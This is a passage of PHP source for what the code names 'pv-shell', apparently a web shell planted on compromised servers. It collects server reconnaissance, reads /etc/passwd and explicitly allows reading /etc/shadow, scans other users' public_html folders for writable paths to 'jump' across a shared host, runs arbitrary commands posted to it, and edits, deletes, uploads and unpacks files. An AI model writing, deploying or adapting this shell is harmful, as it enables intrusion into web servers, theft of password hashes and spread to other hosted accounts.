    $info['Max Execution Time'] = ini_get('max_execution_time') . ' seconds';
    $upload_max_filesize = ini_get('upload_max_filesize');
    $post_max_size = ini_get('post_max_size');
    $info['File Uploads'] = ini_get('file_uploads') ? "ON (upload_max_filesize: {$upload_max_filesize}, post_max_size: {$post_max_size})" : 'OFF';
    if (function_exists('curl_version'))
    {
        $curl_ver = curl_version();
        $curl_ver_num = isset($curl_ver['version']) ? $curl_ver['version'] : 'N/A';
        $info['cURL Support'] = '<span style="color:lime;">Enabled</span> - Version: ' . $curl_ver_num;
    }
    else
    {
        $info['cURL Support'] = '<span style="color:orange;">Disabled</span>';
    }
    $info['Mailer (mail function)'] = function_exists('mail') ? '<span style="color:lime;">Enabled</span>' : '<span style="color:orange;">Disabled</span>';
    $info['System Temp Directory'] = sys_get_temp_dir();
    $server_addr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname(isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
    $info['Server IP'] = $server_addr ? $server_addr : 'N/A';
    $info['Client IP'] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'N/A';
    $info['Server Timezone'] = date_default_timezone_get();
    $info['Server Time (UTC)'] = gmdate("Y-m-d H:i:s");
    $info['Server Time (Local)'] = date("Y-m-d H:i:s");
    $db_ext = array();
    if (extension_loaded('mysqli')) $db_ext[] = 'MySQLi';
    if (extension_loaded('pdo_mysql')) $db_ext[] = 'PDO_MySQL';
    if (extension_loaded('pgsql')) $db_ext[] = 'PostgreSQL';
    if (extension_loaded('pdo_pgsql')) $db_ext[] = 'PDO_PostgreSQL';
    if (extension_loaded('sqlite3')) $db_ext[] = 'SQLite3';
    if (extension_loaded('pdo_sqlite')) $db_ext[] = 'PDO_SQLite';
    $info['Database Extensions'] = !empty($db_ext) ? implode(', ', $db_ext) : 'None commonly detected';
    $current_path_for_disk_space = getcwd() ? getcwd() : __DIR__;
    $disk_free = @disk_free_space($current_path_for_disk_space);
    $disk_total = @disk_total_space($current_path_for_disk_space);
    if ($disk_free !== false && $disk_total !== false && $disk_total > 0)
    {
        $info['Disk Space (Current Partition)'] = 'Free: ' . formatSizeUnits($disk_free) . ' / Total: ' . formatSizeUnits($disk_total) . ' (' . round(($disk_free / $disk_total) * 100, 1) . '% Free)';
    }
    else
    {
        $info['Disk Space (Current Partition)'] = 'N/A';
    }
    $info['Include Path'] = ini_get('include_path');
    $info['Session Save Path'] = ini_get('session.save_path');
    $info['Expose PHP'] = ini_get('expose_php') ? '<span style="color:orange;">ON</span>' : '<span style="color:lime;">OFF</span>';
    $info['Allow URL Fopen'] = ini_get('allow_url_fopen') ? '<span style="color:orange;">ON</span>' : '<span style="color:lime;">OFF</span>';
    $info['Allow URL Include'] = ini_get('allow_url_include') ? '<span style="color:red;">ON (Dangerous)</span>' : '<span style="color:lime;">OFF</span>';
    if (!$is_windows)
    {
        $named_conf_path = '/etc/named.conf';
        if (@is_readable($named_conf_path))
        {
            $info['Domains Config (/etc/named.conf)'] = '<span style="color:lime;">Readable</span>';
        }
        else
        {
            $info['Domains Config (/etc/named.conf)'] = file_exists($named_conf_path) ? '<span style="color:orange;">Not Readable</span>' : '<span style="color:red;">Not Found</span>';
        }
    }
    else
    {
        $info['Domains Config (/etc/named.conf)'] = 'N/A (Linux specific)';
    }
    $network_interface_output = 'Could not execute network interface command or command not found.';
    if (!$is_windows)
    {
        if (command_exists('ip'))
        {
            $network_interface_output = @shell_exec('ip addr');
        }
        elseif (command_exists('ifconfig'))
        {
            $network_interface_output = @shell_exec('ifconfig');
        }
    }
    else
    {
        if (command_exists('ipconfig'))
        {
            $network_interface_output = @shell_exec('ipconfig /all');
        }
    }
    $info['Network Interfaces (attempt)'] = trim($network_interface_output ? $network_interface_output : 'Command failed, no output, or not found.');
    return $info;
}
function formatSizeUnits($bytes)
{
    if ($bytes === false || !is_numeric($bytes) || $bytes < 0) return '-';
    if ($bytes == 0) return '0 B';
    $units = array(
        'B',
        'KB',
        'MB',
        'GB',
        'TB'
    );
    $i = floor(log($bytes, 1024));
    return @round($bytes / pow(1024, $i) , 2) . ' ' . $units[$i];
}
function getJumpingUsernames()
{
    $passwd_file = '/etc/passwd';
    $usernames = array();
    if (@is_readable($passwd_file))
    {
        $lines = @file($passwd_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines === false)
        {
            return array(
                'error' => 'Failed to read /etc/passwd (file error)'
            );
        }
        foreach ($lines as $line)
        {
            $parts = explode(':', $line);
            if (count($parts) >= 6)
            {
                $username = $parts[0];
                $home_dir = $parts[5];
                if (preg_match('#^/home[0-9]*/#', $home_dir) || $home_dir === '/home')
                {
                    $usernames[] = $username;
                }
            }
        }
    }
    else
    {
        return array(
            'error' => 'Cannot access /etc/passwd (Permission denied)'
        );
    }
    return $usernames;
}
function scanJumpingDirectories()
{
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
    {
        return '<span class="jumping-error">This feature is only available on Linux servers.</span>';
    }
    $usernames = getJumpingUsernames();
    $basePaths = array(
        '/home'
    );
    for ($i = 1;$i <= 10;$i++)
    {
        if (is_dir("/home$i"))
        {
            $basePaths[] = "/home$i";
        }
    }
    $results_html = '';
    $found_items = false;
    if (isset($usernames['error']))
    {
        $results_html .= '<span class="jumping-error">Error: ' . htmlspecialchars($usernames['error']) . '</span><br>';
    }
    else
    {
        foreach ($basePaths as $basePath)
        {
            foreach ($usernames as $username)
            {
                $publicHtmlPath = "$basePath/$username/public_html";
                if (@is_dir($publicHtmlPath))
                {
                    $isReadable = @is_readable($publicHtmlPath);
                    $isWritable = @is_writable($publicHtmlPath);
                    if ($isReadable || $isWritable)
                    {
                        $found_items = true;
                        $status = '';
                        $class = '';
                        if ($isWritable)
                        {
                            $status = '[WR]';
                            $class = 'jumping-writable';
                        }
                        elseif ($isReadable)
                        {
                            $status = '[R]';
                            $class = 'jumping-readable';
                        }
                        $results_html .= "<span class=\"$class\">" . htmlspecialchars($status . ' ' . $publicHtmlPath) . "</span><br>";
                    }
                }
            }
        }
    }
    if (!$found_items && !isset($usernames['error']))
    {
        $results_html = "No readable or writable public_html directories found.<br>";
    }
    return $results_html;
}
function uncompress_archive($source, $destination, $original_filename)
{
    if (!is_dir($destination) && !@mkdir($destination, 0755, true))
    {
        return array(
            'status' => 'error',
            'message' => "Could not create destination directory '" . htmlspecialchars($destination) . "'."
        );
    }
    $ext = strtolower(pathinfo($original_filename, PATHINFO_EXTENSION));
    $secondary_ext = strtolower(pathinfo(pathinfo($original_filename, PATHINFO_FILENAME) , PATHINFO_EXTENSION));
    $message = '';
    $status = 'error';
    try
    {
        if ($ext === 'zip')
        {
            if (class_exists('ZipArchive'))
            {
                $zip = new ZipArchive;
                if ($zip->open($source) === true)
                {
                    $zip->extractTo($destination);
                    $zip->close();
                    $message = "Successfully unzipped '" . htmlspecialchars($original_filename) . "' to '" . htmlspecialchars($destination) . "'.";
                    $status = 'success';
                }
                else
                {
                    throw new Exception("Failed to open ZIP archive.");
                }
            }
            elseif (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && command_exists('tar'))
            {
                $cmd = "tar -xf " . escapeshellarg($source) . " -C " . escapeshellarg($destination);
                $output = execute_command_with_fallback($cmd);
                $message = "Successfully attempted to uncompress ZIP via tar command '" . htmlspecialchars($original_filename) . "'.\n\nOutput:\n" . htmlspecialchars($output);
                $status = 'success';
            }
            else
            {
                throw new Exception("The 'ZipArchive' class is not available and no command-line fallback exists for this OS. Please enable the PHP zip extension.");
            }
        }
        elseif ($ext === 'rar')
        {
            if (command_exists('unrar'))
            {
                $cmd = "unrar x -o+ " . escapeshellarg($source) . " " . escapeshellarg($destination . DIRECTORY_SEPARATOR);
                $output = execute_command_with_fallback($cmd);
                $message = "Successfully attempted to uncompress RAR '" . htmlspecialchars($original_filename) . "'.\n\nOutput:\n" . htmlspecialchars($output);
                $status = 'success';
            }
            else
            {
                throw new Exception("The 'unrar' command is not available on the server. Please install it.");
            }
        }
        elseif (in_array($ext, array(
            'gz',
            'bz2'
        )) && $secondary_ext === 'tar' || $ext === 'tar')
        {
            if (class_exists('PharData'))
            {
                $phar = new PharData($source);
                $phar->extractTo($destination, null, true);
                $message = "Successfully extracted TAR archive '" . htmlspecialchars($original_filename) . "' to '" . htmlspecialchars($destination) . "'.";
                $status = 'success';
            }
            else
            {
                throw new Exception("The 'PharData' class is not available. Please enable the PHP phar extension.");
            }
        }
        elseif ($ext === '7z')
        {
            if (command_exists('7z'))
            {
                $cmd = "7z x " . escapeshellarg($source) . " -o" . escapeshellarg($destination) . " -y";
                $output = execute_command_with_fallback($cmd);
                $message = "Successfully attempted to uncompress 7z '" . htmlspecialchars($original_filename) . "'.\n\nOutput:\n" . htmlspecialchars($output);
                $status = 'success';
            }
            else
            {
                throw new Exception("The '7z' command is not available on the server. Please install it (p7zip-full on Debian/Ubuntu).");
            }
        }
        else
        {
            throw new Exception("Unsupported file type: '." . htmlspecialchars($ext) . "'. Only zip, rar, tar, tar.gz, tar.bz2, and 7z are supported.");
        }
    }
    catch(Exception $e)
    {
        $message = $e->getMessage();
        $status = 'error';
    }
    return array(
        'status' => $status,
        'message' => $message
    );
}
// New function for robust JSON encoding that cleans data before encoding
function safe_json_encode($data)
{
    if (function_exists('mb_check_encoding'))
    {
        // Recursively walk through the data and convert non-UTF-8 strings
        array_walk_recursive($data, function (&$item, $key)
        {
            if (is_string($item) && !mb_check_encoding($item, 'UTF-8'))
            {
                // Try to detect encoding, fallback to a common one if detection fails
                $encoding = mb_detect_encoding($item, mb_detect_order() , true);
                $item = mb_convert_encoding($item, 'UTF-8', $encoding ? : 'ISO-8859-1');
            }
        });
    }
    // JSON_INVALID_UTF8_SUBSTITUTE is a final safety net
    $json_options = defined('JSON_INVALID_UTF8_SUBSTITUTE') ? JSON_INVALID_UTF8_SUBSTITUTE : 0;
    $encoded = json_encode($data, $json_options);

    if ($encoded === false)
    {
        // If it still fails, which is highly unlikely now, report the error.
        $error_message = 'JSON encoding failed';
        if (function_exists('json_last_error_msg'))
        {
            $error_message .= ': ' . json_last_error_msg();
        }
        return json_encode(['status' => 'error', 'message' => $error_message]);
    }
    return $encoded;
}
if ($authenticated && isset($_POST['ajax_action']))
{
    if (isset($_SESSION['terminal_cwd']) && is_dir($_SESSION['terminal_cwd']))
    {
        if (!@chdir($_SESSION['terminal_cwd']))
        {
            $_SESSION['terminal_cwd'] = getcwd();
            @chdir($_SESSION['terminal_cwd']);
        }
    }
    else
    {
        $_SESSION['terminal_cwd'] = getcwd();
        @chdir($_SESSION['terminal_cwd']);
    }
    $current_ajax_cwd = $_SESSION['terminal_cwd'];
    switch ($_POST['ajax_action'])
    {
        case 'execute_command':
            if (isset($_POST['command']))
            {
                $command = $_POST['command'];
                if (preg_match('/^cd\s*(.*)/i', $command, $matches))
                {
                    header('Content-Type: application/json');
                    $output = "";
                    $new_dir_input = trim($matches[1]);
                    if (empty($new_dir_input) || $new_dir_input === '~' || $new_dir_input === '$HOME' || ($new_dir_input === '%USERPROFILE%' && DIRECTORY_SEPARATOR === '\\'))
                    {
                        $home_dir = getenv('HOME');
                        if (!$home_dir && DIRECTORY_SEPARATOR === '\\') $home_dir = getenv('USERPROFILE');
                        if ($home_dir && is_dir($home_dir))
                        {
                            $new_dir_abs = $home_dir;
                        }
                        else
                        {
                            $output = "[Error] Could not determine home directory path.";
                            $new_dir_abs = false;
                        }
                    }
                    else
                    {
                        $new_dir = $new_dir_input;
                        if (DIRECTORY_SEPARATOR === '\\')
                        {
                            if (preg_match('/^[a-zA-Z]:$/', $new_dir))
                            {
                                $new_dir_abs = realpath($new_dir . '\\');
                            }
                            elseif (substr($new_dir, 1, 1) === ':')
                            {
                                $new_dir_abs = realpath($new_dir);
                            }
                            else
                            {
                                $new_dir_abs = realpath($current_ajax_cwd . DIRECTORY_SEPARATOR . $new_dir);
                            }
                        }
                        else
                        {
                            if (substr($new_dir, 0, 1) !== '/')
                            {
                                $new_dir_abs = realpath($current_ajax_cwd . '/' . $new_dir);
                            }
                            else
                            {
                                $new_dir_abs = realpath($new_dir);
                            }
                        }
                    }
                    if ($new_dir_abs && is_dir($new_dir_abs))
                    {
                        if (@chdir($new_dir_abs))
                        {
                            $_SESSION['terminal_cwd'] = getcwd();
                            $output = "Changed directory to: " . $_SESSION['terminal_cwd'];
                        }
                        else
                        {
                            $output = "[Error] Could not change directory to " . htmlspecialchars($new_dir_abs) . " (chdir failed, check permissions)";
                        }
                    }
                    elseif ($new_dir_abs !== false)
                    {
                        if (empty($output)) $output = "[Error] Could not change directory to " . htmlspecialchars($new_dir_input) . " (path not found or not a directory)";
                    }
                    else
                    {
                        if (empty($output)) $output = "[Error] Path does not exist: " . htmlspecialchars($new_dir_input);
                    }
                    echo safe_json_encode(array(
                        'status' => 'success',
                        'output' => $output,
                        'cwd' => $_SESSION['terminal_cwd']
                    ));
                }
                else
                {
                    stream_command($command);
                }
            }
            else
            {
                header('Content-Type: application/json');
                echo safe_json_encode(array(
                    'status' => 'error',
                    'message' => 'No command provided.',
                    'cwd' => $current_ajax_cwd
                ));
            }
            exit;
            break;
        case 'abort_command':
            header('Content-Type: application/json');
            $response = array(
                'status' => 'error'
            );
            if (isset($_SESSION['running_process_pid']) && $_SESSION['running_process_pid'])
            {
                $pid = (int)$_SESSION['running_process_pid'];
                $command = '';
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                {
                    $command = "taskkill /F /T /PID " . $pid;
                }
                else
                {
                    if (command_exists('pkill'))
                    {
                        $command = "pkill -9 -P " . $pid . "; kill -9 " . $pid;
                    }
                    else
                    {
                        $command = "kill -9 " . $pid;
                    }
                }
                execute_command_with_fallback($command);
                unset($_SESSION['running_process_pid']);
                $response = array(
                    'status' => 'success',
                    'message' => "Abort signal sent to PID {$pid}."
                );
            }
            else
            {
                $response['message'] = 'No running process PID found in session to abort. The process may have already finished.';
            }
            echo safe_json_encode($response);
            exit;
            break;
        case 'get_file_listing':
            header('Content-Type: application/json');
            $response = array(
                'status' => 'error',
                'message' => 'Invalid AJAX action.'
            );
            $fm_path = isset($_POST['path']) ? $_POST['path'] : $current_ajax_cwd;
            $term_cwd_backup = getcwd();
            $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
            $drives = array();
            if ($is_windows)
            {
                foreach (range('A', 'Z') as $drive)
                {
                    if (is_dir($drive . ':\\'))
                    {
                        $drives[] = $drive . ':';
                    }
                }
            }
            if (!@chdir($fm_path))
            {
                $response['message'] = 'Could not access path: ' . htmlspecialchars($fm_path);
                $response['path'] = htmlspecialchars($fm_path);
                $response['breadcrumbs'] = generate_breadcrumbs($fm_path);
                $response['drives'] = $drives;
                $response['ds'] = DIRECTORY_SEPARATOR;
                @chdir($term_cwd_backup);
                echo safe_json_encode($response);
                exit;
            }
            $realPath = getcwd();
            $_SESSION['filemanager_cwd'] = $realPath;
            $breadcrumbs_data = generate_breadcrumbs($realPath);
            $items = @scandir($realPath);
            if ($items === false)
            {
                $response['message'] = 'Could not read directory: ' . htmlspecialchars($realPath);
                $response['path'] = htmlspecialchars($realPath);
                $response['breadcrumbs'] = $breadcrumbs_data;
                $response['drives'] = $drives;
                $response['ds'] = DIRECTORY_SEPARATOR;
                @chdir($term_cwd_backup);
                echo safe_json_encode($response);
                exit;
            }
            $dirs = array();
            $files_list = array();
            $parentPath = realpath($realPath . DIRECTORY_SEPARATOR . '..');
            if ($parentPath !== false && $parentPath !== $realPath && @is_dir($parentPath))
            {
                $permColorParent = '#FFBF00';
                if (!@is_readable($parentPath)) $permColorParent = '#ff0000';
                elseif (@is_writable($parentPath)) $permColorParent = '#00cc00';
                $dirs[] = array(
                    'name' => '..',
                    'type' => 'dir',
                    'size' => '-',
                    'owner' => 'N/A',
                    'perms' => substr(sprintf('%o', @fileperms($parentPath)) , -4) ,
                    'perm_color' => $permColorParent,
                    'icon_class' => 'fa-solid fa-arrow-turn-up fa-rotate-270',
                    'icon_color' => '#FFBF00',
                    'modified' => date("Y-m-d H:i:s", @filemtime($parentPath)) ,
                    'full_path' => $parentPath
                );
            }
            foreach ($items as $item)
            {
                if ($item === '.' || $item === '..') continue;
                $itemPath = $realPath . DIRECTORY_SEPARATOR . $item;
                $isDir = is_dir($itemPath);
                $permsOctal = substr(sprintf('%o', @fileperms($itemPath)) , -4);
                $owner_info = 'N/A';
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid'))
                {
                    $owner_id = @fileowner($itemPath);
                    $group_id = @filegroup($itemPath);
                    if ($owner_id !== false && $group_id !== false)
                    {
                        $owner_data = @posix_getpwuid($owner_id);
                        $group_data = @posix_getgrgid($group_id);
                        $owner_name = isset($owner_data['name']) ? $owner_data['name'] : $owner_id;
                        $group_name = isset($group_data['name']) ? $group_data['name'] : $group_id;
                        $owner_info = $owner_name . '/' . $group_name;
                    }
                }
                $permColor = '#ffffff';
                if (!@is_readable($itemPath))
                {
                    $permColor = '#ff0000';
                }
                elseif (@is_writable($itemPath))
                {
                    $permColor = '#00ff00';
                }
                $icon_class = 'fa-solid fa-file';
                $icon_color = '#0ff';
                if ($isDir)
                {
                    $icon_class = 'fa-solid fa-folder';
                    $icon_color = '#FFBF00';
                }
                else
                {
                    $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                    if (strtolower($item) === 'dockerfile') $ext = 'dockerfile';
                    switch ($ext)
                    {
                        case 'php':
                        case 'phtml':
                            $icon_class = 'fa-brands fa-php';
                            $icon_color = '#777BB4';
                        break;
                        case 'html':
                        case 'htm':
                            $icon_class = 'fa-brands fa-html5';
                            $icon_color = '#E34F26';
                        break;
                        case 'css':
                            $icon_class = 'fa-brands fa-css3-alt';
                            $icon_color = '#1572B6';
                        break;
                        case 'js':
                        case 'jsx':
                            $icon_class = 'fa-brands fa-js-square';
                            $icon_color = '#F7DF1E';
                        break;
                        case 'json':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#00A65A';
                        break;
                        case 'xml':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#FF6600';
                        break;
                        case 'txt':
                        case 'md':
                        case 'log':
                        case 'ini':
                        case 'conf':
                        case 'cfg':
                            $icon_class = 'fa-solid fa-file-lines';
                            $icon_color = '#cccccc';
                        break;
                        case 'jpg':
                        case 'jpeg':
                        case 'png':
                        case 'gif':
                        case 'bmp':
                        case 'ico':
                        case 'webp':
                        case 'svg':
                            $icon_class = 'fa-solid fa-file-image';
                            $icon_color = '#2ECC71';
                        break;
                        case 'zip':
                        case 'rar':
                        case 'tar':
                        case 'gz':
                        case 'bz2':
                        case '7z':
                            $icon_class = 'fa-solid fa-file-archive';
                            $icon_color = '#F39C12';
                        break;
                        case 'pdf':
                            $icon_class = 'fa-solid fa-file-pdf';
                            $icon_color = '#FF0000';
                        break;
                        case 'doc':
                        case 'docx':
                            $icon_class = 'fa-solid fa-file-word';
                            $icon_color = '#2B579A';
                        break;
                        case 'xls':
                        case 'xlsx':
                            $icon_class = 'fa-solid fa-file-excel';
                            $icon_color = '#217346';
                        break;
                        case 'ppt':
                        case 'pptx':
                            $icon_class = 'fa-solid fa-file-powerpoint';
                            $icon_color = '#D24726';
                        break;
                        case 'sh':
                        case 'bat':
                        case 'exe':
                        case 'ps1':
                            $icon_class = 'fa-solid fa-terminal';
                            $icon_color = '#E74C3C';
                        break;
                        case 'mp3':
                        case 'ogg':
                        case 'wav':
                        case 'aac':
                        case 'flac':
                        case 'm4a':
                            $icon_class = 'fa-solid fa-file-audio';
                            $icon_color = '#9b59b6';
                        break;
                        case 'mp4':
                        case 'avi':
                        case 'mov':
                        case 'mkv':
                        case 'wmv':
                        case 'flv':
                        case 'webm':
                            $icon_class = 'fa-solid fa-file-video';
                            $icon_color = '#3498db';
                        break;
                        case 'py':
                        case 'pyc':
                        case 'pyd':
                        case 'pyo':
                            $icon_class = 'fa-brands fa-python';
                            $icon_color = '#306998';
                        break;
                        case 'java':
                        case 'class':
                        case 'jar':
                            $icon_class = 'fa-brands fa-java';
                            $icon_color = '#f89820';
                        break;
                        case 'rb':
                        case 'gem':
                            $icon_class = 'fa-solid fa-gem';
                            $icon_color = '#CC342D';
                        break;
                        case 'sql':
                        case 'db':
                        case 'sqlite':
                            $icon_class = 'fa-solid fa-database';
                            $icon_color = '#00758F';
                        break;
                        case 'csv':
                            $icon_class = 'fa-solid fa-file-csv';
                            $icon_color = '#1D6F42';
                        break;
                        case 'iso':
                        case 'img':
                        case 'vhd':
                        case 'vmdk':
                            $icon_class = 'fa-solid fa-compact-disc';
                            $icon_color = '#7f8c8d';
                        break;
                        case 'apk':
                            $icon_class = 'fa-brands fa-android';
                            $icon_color = '#A4C639';
                        break;
                        case 'deb':
                            $icon_class = 'fa-brands fa-debian';
                            $icon_color = '#A80030';
                        break;
                        case 'rpm':
                            $icon_class = 'fa-brands fa-redhat';
                            $icon_color = '#EE0000';
                        break;
                        case 'yml':
                        case 'yaml':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#C94282';
                        break;
                        case 'ttf':
                        case 'otf':
                        case 'woff':
                        case 'woff2':
                        case 'eot':
                            $icon_class = 'fa-solid fa-font';
                            $icon_color = '#4A148C';
                        break;
                        case 'swift':
                            $icon_class = 'fa-brands fa-swift';
                            $icon_color = '#F05138';
                        break;
                        case 'c':
                        case 'cpp':
                        case 'h':
                        case 'hpp':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#00599C';
                        break;
                        case 'cs':
                        case 'csproj':
                        case 'sln':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#68217A';
                        break;
                        case 'go':
                            $icon_class = 'fa-brands fa-golang';
                            $icon_color = '#00ADD8';
                        break;
                        case 'rs':
                            $icon_class = 'fa-brands fa-rust';
                            $icon_color = '#DEA584';
                        break;
                        case 'kt':
                        case 'kts':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#7F52FF';
                        break;
                        case 'ts':
                        case 'tsx':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#3178C6';
                        break;
                        case 'dart':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#0175C2';
                        break;
                        case 'lua':
                            $icon_class = 'fa-solid fa-moon';
                            $icon_color = '#2C2D72';
                        break;
                        case 'pl':
                        case 'pm':
                            $icon_class = 'fa-solid fa-file-code';
                            $icon_color = '#0073A2';
                        break;
                        case 'dockerfile':
                            $icon_class = 'fa-brands fa-docker';
                            $icon_color = '#2496ED';
                        break;
                        default:
                            $icon_class = 'fa-solid fa-file-circle-question';
                            $icon_color = '#6c757d';
                        break;
                    }
                }
                $size = $isDir ? '-' : formatSizeUnits(@filesize($itemPath));
                $entry = array(
                    'name' => $item,
                    'type' => $isDir ? 'dir' : 'file',
                    'size' => $size,
                    'owner' => $owner_info,
                    'perms' => $permsOctal,
                    'perm_color' => $permColor,
                    'icon_class' => $icon_class,
                    'icon_color' => $icon_color,
                    'modified' => date("Y-m-d H:i:s", @filemtime($itemPath)) ,
                    'full_path' => $itemPath
                );
                if ($isDir) $dirs[] = $entry;
                else $files_list[] = $entry;
            }
            usort($dirs, function ($a, $b)
            {
                if ($a['name'] === '..') return -1;
                if ($b['name'] === '..') return 1;
                return strcasecmp($a['name'], $b['name']);
            });
            usort($files_list, function ($a, $b)
            {
                return strcasecmp($a['name'], $b['name']);
            });
            $response = array(
                'status' => 'success',
                'files' => array_merge($dirs, $files_list) ,
                'path' => htmlspecialchars($realPath) ,
                'breadcrumbs' => $breadcrumbs_data,
                'drives' => $drives,
                'ds' => DIRECTORY_SEPARATOR
            );
            @chdir($term_cwd_backup);
            echo safe_json_encode($response);
            exit;
            break;
        }
        header('Content-Type: application/json');
        $response = array(
            'status' => 'error',
            'message' => 'Invalid AJAX action.'
        );
        switch ($_POST['ajax_action'])
        {
            case 'get_file_content':
                if (isset($_POST['path']))
                {
                    clearstatcache();
                    $rawPath = $_POST['path'];
                    $filePath = '';
                    $isSystemFile = in_array($rawPath, array(
                        '/etc/passwd',
                        '/etc/shadow'
                    ));
                    if ($isSystemFile)
                    {
                        if (is_file($rawPath) && is_readable($rawPath))
                        {
                            $filePath = $rawPath;
                        }
                        else
                        {
                            $response['message'] = '[Error] System file not found or not readable: ' . htmlspecialchars($rawPath);
                        }
                    }
                    else
                    {
                        $filePath = realpath($rawPath);
                        if (!$filePath || !is_file($filePath) || !is_readable($filePath))
                        {
                            $response['message'] = '[Error] File not found, not a file, or not readable: ' . htmlspecialchars($rawPath);
                            $filePath = '';
                        }
                    }
                    if ($filePath)
                    {
                        $content = @file_get_contents($filePath);
                        if ($content === false)
                        {
                            $response['message'] = '[Error] Could not read file content. Check file permissions and server logs.';
                        }
                        else
                        {
                            $final_content = $content;
                            if (function_exists('mb_convert_encoding'))
                            {
                                $final_content = mb_convert_encoding($content, 'UTF-8', mb_detect_encoding($content, 'UTF-8, ISO-8859-1', true));
                            }
                            if (json_encode(array(
                                'test' => $final_content
                            )) === false)
                            {
                                $response['message'] = '[Error] File content could not be encoded for display. It may be a binary file or have an unsupported encoding.';
                            }
                            else
                            {
                                $response = array(
                                    'status' => 'success',
                                    'content' => $final_content
                                );
                            }
                        }
                    }
                }
                else
                {
                    $response['message'] = '[Error] No file path provided.';
                }
            break;
            case 'save_file_content':
                if (isset($_POST['path']) && isset($_POST['content']))
                {
                    $filePath = $_POST['path'];
                    $dirPath = dirname($filePath);
                    if (!is_dir($dirPath))
                    {
                        if (!@mkdir($dirPath, 0755, true))
                        {
                            $response['message'] = '[Error] Directory cannot be created: ' . htmlspecialchars($dirPath);
                            break;
                        }
                    }
                    if ((!file_exists($filePath) && !is_writable($dirPath)) || (file_exists($filePath) && !is_writable($filePath)))
                    {
                        $response['message'] = '[Error] Path or file not writable: ' . htmlspecialchars($filePath);
                    }
                    else
                    {
                        if (@file_put_contents($filePath, $_POST['content']) !== false)
                        {
                            $response = array(
                                'status' => 'success',
                                'message' => 'File saved: ' . htmlspecialchars(basename($filePath))
                            );
                        }
                        else
                        {
                            $response['message'] = '[Error] Failed to write file: ' . htmlspecialchars(basename($filePath));
                        }
                    }
                }
                else
                {
                    $response['message'] = '[Error] Missing path or content.';
                }
            break;
            case 'delete_item':
                if (isset($_POST['path']))
                {
                    $itemPath = realpath($_POST['path']);
                    if ($itemPath)
                    {
                        if (is_file($itemPath))
                        {
                            $response = @unlink($itemPath) ? array(
                                'status' => 'success',
                                'message' => 'File deleted: ' . htmlspecialchars(basename($itemPath))
                            ) : array(
                                'message' => '[Error] Failed to delete file. Check permissions.'
                            );
                        }
                        elseif (is_dir($itemPath))
                        {
                            function deleteDirectoryRecursive($dir)
                            {
                                if (!file_exists($dir) || !is_dir($dir)) return false;
                                $items = array_diff(scandir($dir) , array(
                                    '.',
                                    '..'
                                ));
                                foreach ($items as $item)
                                {
                                    $path = $dir . DIRECTORY_SEPARATOR . $item;
                                    if (is_dir($path))
                                    {
                                        deleteDirectoryRecursive($path);
                                    }
                                    else
                                    {
                                        @unlink($path);
                                    }
                                }
                                return @rmdir($dir);
                            }
                            $response = deleteDirectoryRecursive($itemPath) ? array(
                                'status' => 'success',
                                'message' => 'Directory deleted: ' . htmlspecialchars(basename($itemPath))
                            ) : array(
                                'message' => '[Error] Failed to delete directory. Check permissions.'
                            );
                        }
                        else
                        {
                            $response['message'] = '[Error] Item is not a file or directory.';
                        }
                    }
                    else
                    {
                        $response['message'] = '[Error] Invalid path: ' . htmlspecialchars($_POST['path']);
                    }
                }
                else
                {
                    $response['message'] = '[Error] No path provided.';
                }
                break;
            case 'upload_file_chunk':
                $upload_target_path = isset($_POST['upload_target_path']) ? $_POST['upload_target_path'] : $current_ajax_cwd;
                $realUploadDir = realpath($upload_target_path);
                if (!$realUploadDir || !is_dir($realUploadDir) || !is_writable($realUploadDir))
                {
                    $response['message'] = '[Error] Upload directory is not writable or does not exist: ' . htmlspecialchars($upload_target_path);
                    break;
                }
                if (empty($_FILES['chunk']['tmp_name']) || !isset($_POST['upload_id']) || !isset($_POST['chunk_index']) || !isset($_POST['total_chunks']) || !isset($_POST['original_filename']))
                {
                    $response['message'] = '[Error] Invalid chunk upload request. Missing parameters.';
                    break;
                }
                $temp_upload_dir = rtrim(sys_get_temp_dir() , DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'pv-shell-uploads';
                if (!is_dir($temp_upload_dir) && !@mkdir($temp_upload_dir, 0755, true))
                {
                    $response['message'] = '[Error] Could not create temporary upload directory.';
                    break;
                }
                $upload_id = basename($_POST['upload_id']);
                $chunk_dir = $temp_upload_dir . DIRECTORY_SEPARATOR . $upload_id;
                if (!is_dir($chunk_dir) && !@mkdir($chunk_dir, 0755, true))
                {
                    $response['message'] = '[Error] Could not create temporary chunk directory.';
                    break;
                }
                $chunk_index = (int)$_POST['chunk_index'];
                $total_chunks = (int)$_POST['total_chunks'];
                $original_filename = basename($_POST['original_filename']);
                $chunk_path = $chunk_dir . DIRECTORY_SEPARATOR . $chunk_index;
                if (@move_uploaded_file($_FILES['chunk']['tmp_name'], $chunk_path))
                {
                    if (($chunk_index + 1) == $total_chunks)
                    {
                        $reassemble_result = reassembleFileChunks($upload_id, $original_filename, $total_chunks, $realUploadDir);
                        if ($reassemble_result === true)
                        {
                            $response = array(
                                'status' => 'success',
                                'message' => 'File ' . htmlspecialchars($original_filename) . ' uploaded successfully.'
                            );
                        }
                        else
                        {
                            $response['message'] = '[Error] ' . $reassemble_result;
                        }
                    }
                    else
                    {
                        $response = array(
                            'status' => 'chunk_ok',
                            'message' => 'Chunk ' . $chunk_index . ' received.'
                        );
                    }
                }
                else
